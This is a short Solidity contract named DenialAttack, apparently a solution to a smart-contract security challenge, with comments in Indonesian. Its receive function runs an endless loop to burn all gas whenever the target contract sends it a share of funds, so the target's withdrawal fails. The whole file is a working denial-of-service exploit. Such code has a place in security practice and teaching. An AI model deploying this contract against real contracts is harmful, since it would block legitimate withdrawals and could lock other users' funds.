// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    
    // Fungsi ini terpanggil saat Denial mengirim 1% dana
    receive() external payable {
        // Kita buat infinite loop untuk membakar semua gas
        // Sampai transaksi error "Out of Gas"
        while (true) {}
    }
}